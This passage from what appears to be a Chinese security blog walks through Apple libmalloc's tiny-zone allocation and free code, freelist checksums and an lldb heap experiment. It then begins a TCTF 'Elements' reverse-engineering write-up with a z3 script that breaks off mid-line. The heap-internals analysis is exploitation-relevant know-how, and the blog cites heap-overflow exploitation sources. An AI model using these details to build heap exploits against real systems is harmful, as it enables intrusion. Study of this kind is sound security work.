title="tiny_malloc_should_clear"></a>tiny_malloc_should_clear</h5><pre><code class="c">void *tiny_malloc_should_clear(rack_t *rack, msize_t msize, boolean_t cleared_requested){    void *ptr;    mag_index_t mag_index = tiny_mag_get_thread_index() % rack-&gt;num_magazines;    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_malloc, (uintptr_t)rack, TINY_BYTES_FOR_MSIZE(msize), (uintptr_t)tiny_mag_ptr, cleared_requested);#if DEBUG_MALLOC    if (DEPOT_MAGAZINE_INDEX == mag_index) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;malloc called for magazine index -1\n&quot;);        return (NULL);    }    if (!msize) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;invariant broken (!msize) in allocation (region)\n&quot;);        return (NULL);    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    ptr = tiny_mag_ptr-&gt;mag_last_free;    if (tiny_mag_ptr-&gt;mag_last_free_msize == msize) {        // we have a winner        tiny_mag_ptr-&gt;mag_last_free = NULL;        tiny_mag_ptr-&gt;mag_last_free_msize = 0;        tiny_mag_ptr-&gt;mag_last_free_rgn = NULL;        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        CHECK(szone, __PRETTY_FUNCTION__);        if (cleared_requested) {            memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));        }#if DEBUG_MALLOC        if (LOG(szone, ptr)) {            malloc_report(ASL_LEVEL_INFO, &quot;in tiny_malloc_should_clear(), tiny cache ptr=%p, msize=%d\n&quot;, ptr, msize);        }#endif        return ptr;    }#endif /* CONFIG_TINY_CACHE */    while (1) {        ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);        if (ptr) {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            if (cleared_requested) {                memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));            }            return ptr;        }        if (tiny_get_region_from_depot(rack, tiny_mag_ptr, mag_index, msize)) {            ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);            if (ptr) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                if (cleared_requested) {                    memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));                }                return ptr;            }        }        // The magazine is exhausted. A new region (heap) must be allocated to satisfy this call to malloc().        // The allocation, an mmap() system call, will be performed outside the magazine spin locks by the first        // thread that suffers the exhaustion. That thread sets &quot;alloc_underway&quot; and enters a critical section.        // Threads arriving here later are excluded from the critical section, yield the CPU, and then retry the        // allocation. After some time the magazine is resupplied, the original thread leaves with its allocation,        // and retry-ing threads succeed in the code just above.        if (!tiny_mag_ptr-&gt;alloc_underway) {            void *fresh_region;            // time to create a new region (do this outside the magazine lock)            tiny_mag_ptr-&gt;alloc_underway = TRUE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            fresh_region = mvm_allocate_pages_securely(TINY_REGION_SIZE, TINY_BLOCKS_ALIGN, VM_MEMORY_MALLOC_TINY, rack-&gt;debug_flags);            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);            // DTrace USDT Probe            MAGMALLOC_ALLOCREGION(TINY_SZONE_FROM_RACK(rack), (int)mag_index, fresh_region, TINY_REGION_SIZE);            if (!fresh_region) { // out of memory!                tiny_mag_ptr-&gt;alloc_underway = FALSE;                OSMemoryBarrier();                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                return NULL;            }            ptr = tiny_malloc_from_region_no_lock(rack, tiny_mag_ptr, mag_index, msize, fresh_region);            // we don&#39;t clear because this freshly allocated space is pristine            tiny_mag_ptr-&gt;alloc_underway = FALSE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            return ptr;        } else {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            yield();            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);        }    }    /* NOTREACHED */}</code></pre><p>这里的<code>if (tiny_mag_ptr-&gt;mag_last_free_msize == msize)</code>是判断申请大小是否和缓存的大小相同，如果相同，则直接把该内存返回给程序。反之则从<code>ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);</code>free list中去获取刚好大于该大小的free list。这里的free list是按quantum的倍数递增的一个链表。若还是不能满足则去freelist中由合并得到的较大block中去分配。还不能满足则去region剩余部分申请。最后还不满足则申请新的一个region。申请失败则返回NULL。</p><h5 id="free-gt-malloc-zone-free-gt-szone-free"><a href="#free-gt-malloc-zone-free-gt-szone-free" class="headerlink" title="free-&gt;malloc_zone_free-&gt;szone_free"></a>free-&gt;malloc_zone_free-&gt;szone_free</h5><pre><code class="c">voidszone_free(szone_t *szone, void *ptr){    region_t tiny_region;    region_t small_region;#if DEBUG_MALLOC    if (LOG(szone, ptr)) {        malloc_report(ASL_LEVEL_INFO, &quot;in szone_free with %p\n&quot;, ptr);    }#endif    if (!ptr) {        return;    }    /*     * Try to free to a tiny region.     */    if ((uintptr_t)ptr &amp; (TINY_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed\n&quot;, ptr);        return;    }    if ((tiny_region = tiny_region_for_ptr_no_lock(&amp;szone-&gt;tiny_rack, ptr)) != NULL) {        if (TINY_INDEX_FOR_PTR(ptr) &gt;= NUM_TINY_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed\n&quot;, ptr);            return;        }        free_tiny(&amp;szone-&gt;tiny_rack, ptr, tiny_region, 0);        return;    }    /*     * Try to free to a small region.     */    if ((uintptr_t)ptr &amp; (SMALL_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed (2)\n&quot;, ptr);        return;    }    if ((small_region = small_region_for_ptr_no_lock(&amp;szone-&gt;small_rack, ptr)) != NULL) {        if (SMALL_META_INDEX_FOR_PTR(ptr) &gt;= NUM_SMALL_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed (2)\n&quot;, ptr);            return;        }        free_small(&amp;szone-&gt;small_rack, ptr, small_region, 0);        return;    }    /* check that it&#39;s a legal large allocation */    if ((uintptr_t)ptr &amp; (vm_page_quanta_size - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;non-page-aligned, non-allocated pointer %p being freed\n&quot;, ptr);        return;    }    free_large(szone, ptr);}</code></pre><p>同样，free的时候会先判断该内存是否属于tiny，small，large。则选取对应的free函数。这里以tiny为例</p><pre><code class="c">voidfree_tiny(rack_t *rack, void *ptr, region_t tiny_region, size_t known_size){    msize_t msize;    boolean_t is_free;    mag_index_t mag_index = MAGAZINE_INDEX_FOR_TINY_REGION(tiny_region);    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_free, (uintptr_t)rack, (uintptr_t)ptr, (uintptr_t)tiny_mag_ptr, known_size);    // ptr is known to be in tiny_region    if (known_size) {        msize = TINY_MSIZE_FOR_BYTES(known_size + TINY_QUANTUM - 1);    } else {        msize = get_tiny_meta_header(ptr, &amp;is_free);        if (is_free) {            free_tiny_botch(rack, ptr);            return;        }    }#if DEBUG_MALLOC    if (!msize) {        malloc_report(ASL_LEVEL_ERR, &quot;*** free_tiny() block in use is too large: %p\n&quot;, ptr);        return;    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    // Depot does not participate in CONFIG_TINY_CACHE since it can&#39;t be directly malloc()&#39;d    if (DEPOT_MAGAZINE_INDEX != mag_index) {        if (msize &lt; TINY_QUANTUM) {                      // to see if the bits fit in the last 4 bits            void *ptr2 = tiny_mag_ptr-&gt;mag_last_free; // Might be NULL            msize_t msize2 = tiny_mag_ptr-&gt;mag_last_free_msize;            region_t rgn2 = tiny_mag_ptr-&gt;mag_last_free_rgn;            /* check that we don&#39;t already have this pointer in the cache */            if (ptr == ptr2) {                free_tiny_botch(rack, ptr);                return;            }            if ((rack-&gt;debug_flags &amp; MALLOC_DO_SCRIBBLE) &amp;&amp; msize) {                memset(ptr, SCRABBLE_BYTE, TINY_BYTES_FOR_MSIZE(msize));            }            tiny_mag_ptr-&gt;mag_last_free = ptr;            tiny_mag_ptr-&gt;mag_last_free_msize = msize;            tiny_mag_ptr-&gt;mag_last_free_rgn = tiny_region;            if (!ptr2) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                return;            }            msize = msize2;            ptr = ptr2;            tiny_region = rgn2;        }    }#endif /* CONFIG_TINY_CACHE */    // Now in the time it took to acquire the lock, the region may have migrated    // from one magazine to another. I.e. trailer-&gt;mag_index is volatile.    // In which case the magazine lock we obtained (namely magazines[mag_index].mag_lock)    // is stale. If so, keep on tryin&#39; ...    region_trailer_t *trailer = REGION_TRAILER_FOR_TINY_REGION(tiny_region);    mag_index_t refreshed_index;    while (mag_index != (refreshed_index = trailer-&gt;mag_index)) { // Note assignment        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        mag_index = refreshed_index;        tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);        SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);    }    if (tiny_free_no_lock(rack, tiny_mag_ptr, mag_index, tiny_region, ptr, msize)) {        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);    }    CHECK(szone, __PRETTY_FUNCTION__);}</code></pre><p>free的时候先将该内存缓存到<code>mag_last_free</code>，若之前<code>mag_last_free</code>为NULL，那么该内存暂时不会被free，仅仅是缓存到<code>mag_last_free</code>。反之，则会将<code>mag_last_free</code>之前的内存free。在free的时候会尝试向前向后合并。合并完成后设置其前后chunk指针等metadata后将其放入对应的free list大小之中。这里需要有注意以下几点</p><ul><li>最近free的内存会被缓存，不会立即合并</li><li>在被free的块metadata是被保护的<ul><li>前后指针按16字节大小对齐</li><li>指针前4位为checksum</li></ul></li></ul><p>关于free块checksum计算如下：</p><pre><code class="c">static MALLOC_INLINE uintptr_tfree_list_checksum_ptr(rack_t *rack, void *ptr){    uintptr_t p = (uintptr_t)ptr;    return (p &gt;&gt; NYBBLE) | ((free_list_gen_checksum(p ^ rack-&gt;cookie) &amp; (uintptr_t)0xF) &lt;&lt; ANTI_NYBBLE); // compiles to rotate instruction}</code></pre><p>指针p与cookie异或然后计算checksum后左移到最高字节或上指针p右移4位得到checksumed后的指针。</p><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>代码如下</p><pre><code class="c">#include &lt;stdio.h&gt;int main(int argc, char *argv[]) {    void *p1,*p2,*p3,*p4;    p1 = malloc(24);    p2 = malloc(24);    p3 = malloc(24);    p4 = malloc(24);    memset(p1,0xaa,24);    memset(p2,0xbb,24);    memset(p3,0xcc,24);    free(p1);    free(p3);    free(p2);    free(p4);}</code></pre><p>free(p1)，直接将p1缓存，所以内存值不变</p><pre><code class="c">(lldb) x/24gx p10x1002001f0: 0xaaaaaaaaaaaaaaaa 0xaaaaaaaaaaaaaaaa0x100200200: 0xaaaaaaaaaaaaaaaa 0x00007fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p3)，p3放入缓存，p1放入大小为32字节的freelist，p1previous指针8字节设为NULL，next指针指向设为下一个free block，紧接着后面为该block大小，2*quantum=32字节</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p2)，p2放入缓存，p3放入大小为32字节的freelist，p3previous指针8字节设为NULL，next指针指向设为下一个p1</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x3000000010020023 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x200000001002001f0x100200240: 0xcccccccccccc0002 0x00020000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>free(p4)，p2向前向后合并，合并p1，p3。指向p1，大小为6*quantum=96字节。previous指针8字节设为NULL，next指针指向设为下一个大小为3Q的block</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x50000000100200480x100200200: 0xaaaaaaaaaaaa0006 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x10000000100201080x100200240: 0xcccccccccccc0002 0x00060000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>上面可以看出previous和next指针前4位都包含checksum。与上面描述的一致。</p><h4 id="libmalloc中一些结构体"><a href="#libmalloc中一些结构体" class="headerlink" title="libmalloc中一些结构体"></a>libmalloc中一些结构体</h4><h5 id="szone-s-magazine-zone-h"><a href="#szone-s-magazine-zone-h" class="headerlink" title="szone_s // magazine_zone.h"></a>szone_s // magazine_zone.h</h5><pre><code class="c">typedef struct szone_s {      // vm_allocate()&#39;d, so page-aligned to begin with.    malloc_zone_t basic_zone; // first page will be given read-only protection    uint8_t pad[PAGE_MAX_SIZE - sizeof(malloc_zone_t)];    unsigned long cpu_id_key; // unused    // remainder of structure is R/W (contains no function pointers)    unsigned debug_flags;    void *log_address;    /* Allocation racks per allocator type. */    struct rack_s tiny_rack;    struct rack_s small_rack;    /* large objects: all the rest */    _malloc_lock_s large_szone_lock MALLOC_CACHE_ALIGN; // One customer at a time for large    unsigned num_large_objects_in_use;    unsigned num_large_entries;    large_entry_t *large_entries; // hashed by location; null entries don&#39;t count    size_t num_bytes_in_large_objects;#if CONFIG_LARGE_CACHE    int large_entry_cache_oldest;    int large_entry_cache_newest;    large_entry_t large_entry_cache[LARGE_ENTRY_CACHE_SIZE]; // &quot;death row&quot; for large malloc/free    boolean_t large_legacy_reset_mprotect;    size_t large_entry_cache_reserve_bytes;    size_t large_entry_cache_reserve_limit;    size_t large_entry_cache_bytes; // total size of death row, bytes#endif    /* flag and limits pertaining to altered malloc behavior for systems with     * large amounts of physical memory */    unsigned is_largemem;    unsigned large_threshold;    unsigned vm_copy_threshold;    /* security cookie */    uintptr_t cookie;    /* The purgeable zone constructed by create_purgeable_zone() would like to hand off tiny and small     * allocations to the default scalable zone. Record the latter as the &quot;helper&quot; zone here. */    struct szone_s *helper_zone;    boolean_t flotsam_enabled;} szone_t;</code></pre><h5 id="malloc-zone-t-malloc-h"><a href="#malloc-zone-t-malloc-h" class="headerlink" title="malloc_zone_t // malloc.h"></a>malloc_zone_t // malloc.h</h5><pre><code class="c">typedef struct _malloc_zone_t {    /* Only zone implementors should depend on the layout of this structure;    Regular callers should use the access functions below */    void    *reserved1;    /* RESERVED FOR CFAllocator DO NOT USE */    void    *reserved2;    /* RESERVED FOR CFAllocator DO NOT USE */    size_t     (* MALLOC_ZONE_FN_PTR(size))(struct _malloc_zone_t *zone, const void *ptr); /* returns the size of a block or 0 if not in this zone; must be fast, especially for negative answers */    void     *(* MALLOC_ZONE_FN_PTR(malloc))(struct _malloc_zone_t *zone, size_t size);    void     *(* MALLOC_ZONE_FN_PTR(calloc))(struct _malloc_zone_t *zone, size_t num_items, size_t size); /* same as malloc, but block returned is set to zero */    void     *(* MALLOC_ZONE_FN_PTR(valloc))(struct _malloc_zone_t *zone, size_t size); /* same as malloc, but block returned is set to zero and is guaranteed to be page aligned */    void     (* MALLOC_ZONE_FN_PTR(free))(struct _malloc_zone_t *zone, void *ptr);    void     *(* MALLOC_ZONE_FN_PTR(realloc))(struct _malloc_zone_t *zone, void *ptr, size_t size);    void     (* MALLOC_ZONE_FN_PTR(destroy))(struct _malloc_zone_t *zone); /* zone is destroyed and all memory reclaimed */g    const char    *zone_name;    /* Optional batch callbacks; these may be NULL */    unsigned    (* MALLOC_ZONE_FN_PTR(batch_malloc))(struct _malloc_zone_t *zone, size_t size, void **results, unsigned num_requested); /* given a size, returns pointers capable of holding that size; returns the number of pointers allocated (maybe 0 or less than num_requested) */    void    (* MALLOC_ZONE_FN_PTR(batch_free))(struct _malloc_zone_t *zone, void **to_be_freed, unsigned num_to_be_freed); /* frees all the pointers in to_be_freed; note that to_be_freed may be overwritten during the process */    struct malloc_introspection_t    * MALLOC_INTROSPECT_TBL_PTR(introspect);    unsigned    version;    /* aligned memory allocation. The callback may be NULL. Present in version &gt;= 5. */    void *(* MALLOC_ZONE_FN_PTR(memalign))(struct _malloc_zone_t *zone, size_t alignment, size_t size);    /* free a pointer known to be in zone and known to have the given size. The callback may be NULL. Present in version &gt;= 6.*/    void (* MALLOC_ZONE_FN_PTR(free_definite_size))(struct _malloc_zone_t *zone, void *ptr, size_t size);    /* Empty out caches in the face of memory pressure. The callback may be NULL. Present in version &gt;= 8. */    size_t     (* MALLOC_ZONE_FN_PTR(pressure_relief))(struct _malloc_zone_t *zone, size_t goal);    /*     * Checks whether an address might belong to the zone. May be NULL. Present in version &gt;= 10.     * False positives are allowed (e.g. the pointer was freed, or it&#39;s in zone space that has     * not yet been allocated. False negatives are not allowed.     */    boolean_t (* MALLOC_ZONE_FN_PTR(claimed_address))(struct _malloc_zone_t *zone, void *ptr);} malloc_zone_t;</code></pre><h5 id="rack-t-magazine-rack-h"><a href="#rack-t-magazine-rack-h" class="headerlink" title="rack_t // magazine_rack.h"></a>rack_t // magazine_rack.h</h5><pre><code class="c">typedef struct rack_s {    /* Regions for tiny objects */    _malloc_lock_s region_lock MALLOC_CACHE_ALIGN;    rack_type_t type;    size_t num_regions;    size_t num_regions_dealloc;    region_hash_generation_t *region_generation;    region_hash_generation_t rg[2];    region_t initial_regions[INITIAL_NUM_REGIONS];    int num_magazines;    unsigned num_magazines_mask;    int num_magazines_mask_shift;    uint32_t debug_flags;    // array of per-processor magazines    magazine_t *magazines;    uintptr_t cookie;    uintptr_t last_madvise;} rack_t;</code></pre><h5 id="magazine-t-magazine-zone-h"><a href="#magazine-t-magazine-zone-h" class="headerlink" title="magazine_t // magazine_zone.h"></a>magazine_t // magazine_zone.h</h5><pre><code class="c">typedef struct magazine_s { // vm_allocate()&#39;d, so the array of magazines is page-aligned to begin with.    // Take magazine_lock first,  Depot lock when needed for recirc, then szone-&gt;{tiny,small}_regions_lock when needed for alloc    _malloc_lock_s magazine_lock MALLOC_CACHE_ALIGN;    // Protection for the crtical section that does allocate_pages outside the magazine_lock    volatile boolean_t alloc_underway;    // One element deep &quot;death row&quot;, optimizes malloc/free/malloc for identical size.    void *mag_last_free;    msize_t mag_last_free_msize;    // msize for mag_last_free#if MALLOC_TARGET_64BIT    uint32_t _pad;#endif    region_t mag_last_free_rgn; // holds the region for mag_last_free    free_list_t mag_free_list[MAGAZINE_FREELIST_SLOTS];    uint32_t mag_bitmap[MAGAZINE_FREELIST_BITMAP_WORDS];    // the first and last free region in the last block are treated as big blocks in use that are not accounted for    size_t mag_bytes_free_at_end;    size_t mag_bytes_free_at_start;    region_t mag_last_region; // Valid iff mag_bytes_free_at_end || mag_bytes_free_at_start &gt; 0    // bean counting ...    size_t mag_num_bytes_in_objects;    size_t num_bytes_in_magazine;    unsigned mag_num_objects;    // recirculation list -- invariant: all regions owned by this magazine that meet the emptiness criteria    // are located nearer to the head of the list than any region that doesn&#39;t satisfy that criteria.    // Doubly linked list for efficient extraction.    unsigned recirculation_entries;    region_trailer_t *firstNode;    region_trailer_t *lastNode;#if MALLOC_TARGET_64BIT    uintptr_t pad[320 - 14 - MAGAZINE_FREELIST_SLOTS -            (MAGAZINE_FREELIST_BITMAP_WORDS + 1) / 2];#else    uintptr_t pad[320 - 16 - MAGAZINE_FREELIST_SLOTS -            MAGAZINE_FREELIST_BITMAP_WORDS];#endif} magazine_t;</code></pre><h5 id="tiny-region-t-magazine-zone-h"><a href="#tiny-region-t-magazine-zone-h" class="headerlink" title="tiny_region_t //magazine_zone.h"></a>tiny_region_t //magazine_zone.h</h5><pre><code class="c">/* * Layout of a tiny region */typedef uint32_t tiny_block_t[4]; // assert(TINY_QUANTUM == sizeof(tiny_block_t))typedef struct tiny_header_inuse_pair {    uint32_t header;    uint32_t inuse;} tiny_header_inuse_pair_t;typedef struct region_trailer {    struct region_trailer *prev;    struct region_trailer *next;    boolean_t recirc_suitable;    volatile int pinned_to_depot;    unsigned bytes_used;    mag_index_t mag_index;} region_trailer_t;#define NUM_TINY_BLOCKS 64520typedef struct tiny_region {    tiny_block_t blocks[NUM_TINY_BLOCKS];    region_trailer_t trailer;    // The interleaved bit arrays comprising the header and inuse bitfields.    // The unused bits of each component in the last pair will be initialized to sentinel values.    tiny_header_inuse_pair_t pairs[CEIL_NUM_TINY_BLOCKS_WORDS];    uint8_t pad[TINY_REGION_SIZE - (NUM_TINY_BLOCKS * sizeof(tiny_block_t)) - TINY_METADATA_SIZE];} * tiny_region_t;</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><p><a href="http://phrack.org/issues/63/5.html" target="_blank" rel="external">http://phrack.org/issues/63/5.html</a></p></li><li><p><a href="https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf" target="_blank" rel="external">https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf</a></p></li><li><p><a href="https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf" target="_blank" rel="external">https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf</a></p></li><li><p><a href="https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html" target="_blank" rel="external">https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html</a></p></li><li><p>&lt;&lt;<a href="https://repo.zenk-security.com/Magazine%20E-book/The%20Mac%20Hacker&#39;s%20Handbook.pdf" target="_blank" rel="external">the Mac Hacker’s Handbook</a>&gt;&gt; 第8章Exploiting Heap Overflows</p></li><li><p><a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">https://opensource.apple.com/source/libmalloc/</a> 源代码</p></li><li><p><a href="http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf" target="_blank" rel="external">http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;源码解读macOS-iOS-Heap&quot;&gt;&lt;a href=&quot;#源码解读macOS-iOS-Heap&quot; class=&quot;headerlink&quot; title=&quot;源码解读macOS/iOS Heap&quot;&gt;&lt;/a&gt;源码解读macOS/iOS Heap&lt;/h3&gt;&lt;blockquo
      
    
    </summary>
    
      <category term="OS" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/OS/"/>
    
    
      <category term="heap" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>TCTF-Elements</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/</id>
    <published>2019-03-27T07:13:30.000Z</published>
    <updated>2019-03-28T07:06:17.336Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TCTF-Elements"><a href="#TCTF-Elements" class="headerlink" title="TCTF-Elements"></a>TCTF-Elements</h4><blockquote><p>这道题其实是一个数学问题，当时没有做出来，解题过程中走了很多弯路，踩了很多坑，不过也补了很多知识。</p></blockquote><h4 id="Elements"><a href="#Elements" class="headerlink" title="Elements"></a>Elements</h4><p>下面是main函数伪代码</p><pre><code class="c">signed __int64 __fastcall main(__int64 a1, char **a2, char **a3){  char v3; // bl  const __int32_t **v4; // rax  char *v5; // rcx  size_t v6; // rcx  signed __int64 result; // rax  char *v8; // r12  signed __int64 v9; // r14  char v10; // bl  signed __int64 v11; // rax  const unsigned __int16 *v12; // rcx  signed __int64 v13; // rdx  __int64 v14; // rsi  unsigned __int16 v15; // bx  signed __int64 v16; // rsi  __m128i v17; // xmm0  char *v18; // rax  double v19; // xmm2_8  double v20; // xmm0_8  double v21; // xmm2_8  double v22; // xmm3_8  double v23; // [rsp+20h] [rbp-148h]  double v24; // [rsp+28h] [rbp-140h]  double v25; // [rsp+30h] [rbp-138h]  char s[8]; // [rsp+40h] [rbp-128h]  char v27; // [rsp+6Bh] [rbp-FDh]  fgets(s, 256, stdin);  v3 = s[0];  if ( s[0] )  {    v4 = __ctype_tolower_loc();    v5 = &amp;s[1];    do    {      *(v5 - 1) = (*v4)[v3];      v3 = *v5++;    }    while ( v3 );  }  v6 = strlen(s);  result = 0LL;  if ( v6 &gt;= 0x2C &amp;&amp; (*(_QWORD *)s &amp; 0xFFFFFFFFFFLL) == 530015415398LL &amp;&amp; v27 == 125 )  {    v27 = 0;    v8 = strtok(&amp;s[5], &quot;-&quot;);    v9 = 0LL;    if ( v8 )    {      while ( strlen(v8) == 12 )      {        v10 = *v8;        v11 = 0LL;        if ( *v8 )        {          v12 = *__ctype_b_loc();          v13 = 1LL;          v11 = 0LL;          do          {            v14 = v10;            v15 = v12[v10];            if ( (char)v14 &lt;= 102 &amp;&amp; v15 &amp; 0x400 )            {              v16 = v14 - 87;            }            else            {              if ( !(v15 &amp; 0x800) )                goto LABEL_31;              v16 = v14 - 48;            }            v11 = v16 | 16 * v11;            if ( v13 &gt; 11 )              break;            v10 = v8[v13++];          }          while ( v10 );        }        if ( !v9 &amp;&amp; v11 != 62791383142154LL )          break;        v17 = (__m128i)_mm_sub_pd(                         (__m128d)_mm_unpacklo_epi32((__m128i)(unsigned __int64)v11, (__m128i)xmmword_400BD0),                         (__m128d)xmmword_400BE0);        *(&amp;v23 + v9++) = COERCE_DOUBLE(_mm_shuffle_epi32(v17, 78)) + *(double *)v17.m128i_i64;        v18 = strtok(0LL, &quot;-&quot;);        v8 = v18;        if ( v9 &gt; 2 || !v18 )        {          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }          return 0LL;        }      }    }LABEL_31:    result = 0xFFFFFFFFLL;  }  return result;}</code></pre><p>这个题整个逻辑很清晰，前面一部分对输入的字符串做了一些格式和字符数量判断。</p><p>分析可得到需要输入以下格式<code>flag{xxxxxxxxxxxx-xxxxxxxxxxxx-xxxxxxxxxxxx}</code></p><p>这里通过<code>-</code>分割成三个部分，其中第一部分是已知的<code>391bc2164f0a</code>，后面就是程序验证逻辑</p><pre><code class="c">          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }</code></pre><p>当时一看其实就知道是一个三角形相关的运算，整理可得以下表达式</p><p>$c&gt;b,b&gt;a,a+b&gt;c$</p><p>$p=\frac{\sqrt{4a^2b^2-(a^2+b^2-c^2)^2)}}{2(a+b+c)}-1.940035480806554e13$</p><p>$q=\frac{abc}{(\sqrt{4a^2b^2-(a^2+b^2-c^2)^2})}-4.777053952827391e13$</p><p>$-0.00001&lt;p&lt;0.00001,-0.00001&lt;q&lt;0.00001 $</p><p>但并没有看出来是三角形内外圆的半径公式，所以想着直接上约束求解器z3</p><pre><code class="python">from z3 import *x = Real(&#39;x&#39;)y = Real(&#39;y&#39;)z = Real(&#39;z&#39;)m = Real(&#39;m&#39;)n = Real(&#39;n&#39;)p = Real(&#39;p&#39;)q = Real(&#39;q&#39;)solver = Solver()m = x*x+y*y-z*zn = (4.0*x*x*y*y-m*m)**0.5*0.25p = 2*n/(x+y+z) + (-1.940035480806554296875E13)q = x*y*z/(4.0*n) + (-4.777053952827391e13)solver.add(z &gt; y)solver.add(y &gt; x)solver.add(x + y &gt; z)solver.add(p &gt; -100,p&lt;100)solver.add(q &gt; -100,q&lt;100)solver.add(x == 